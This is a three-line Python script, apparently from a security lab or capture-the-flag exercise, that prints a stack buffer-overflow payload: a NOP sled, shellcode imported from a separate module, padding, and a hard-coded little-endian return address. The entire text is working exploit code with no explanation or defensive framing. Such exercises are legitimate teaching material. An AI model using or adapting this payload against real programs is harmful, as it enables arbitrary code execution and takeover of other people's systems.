from shellcode import shellcode
import sys
sys.stdout.buffer.write((b"\x90" * 512) + shellcode + (b"\x90" * 471) + 0xfff6e5fc.to_bytes(4, "little"))